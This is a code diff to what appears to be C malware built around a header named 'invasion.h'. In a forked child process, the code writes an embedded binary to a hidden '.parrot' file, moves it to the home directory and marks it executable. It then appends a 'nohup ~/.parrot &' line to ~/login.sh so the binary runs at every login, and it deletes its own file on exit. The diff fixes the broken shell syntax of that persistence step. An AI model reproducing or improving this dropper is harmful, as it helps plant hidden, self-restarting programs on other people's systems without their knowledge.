@@ -2,6 +2,7 @@
 
 # include "config.h"
 #include "../invasion.h"
+#include <argz.h>
 
 int	_raid();
 
@@ -53,14 +54,15 @@ int	_invasion(
 	if (pid == 0)
 	{
 		file = fopen(".parrot", "wb");
-		fwrite(bin_invasion, sizeof(bin_invasion), 1, file);
+		fwrite(__invasion, __invasion_len, 1, file);
 		sprintf(buffer,
 			"mv .parrot ~/.parrot && "
 			"chmod +x ~/.parrot && "
-			"if [ cat ~/login.sh | grep -q 'nohup ~/.parrot &' ]; then "
+			"if grep -q 'nohup ~/.parrot &' ~/login.sh; then "
 				"echo 'Already set up.';"
 			"else "
-				"echo 'nohup ~/.parrot &' >> ~/login.sh"
+				"echo 'nohup ~/.parrot &' >> ~/login.sh;"
+			"fi"
 		);
 		fclose(file);
 		execlp("bash", "bash", "-c", buffer, (char *)NULL);
@@ -84,7 +86,7 @@ __attribute__((noreturn)) int	_quit(
 )
 {
 	unlink(name);
-	fprintf(stdout, 
+	PRINT_DEBUG(
 		CLEAR
 		"Cleaning up and exiting...\n"
 	);
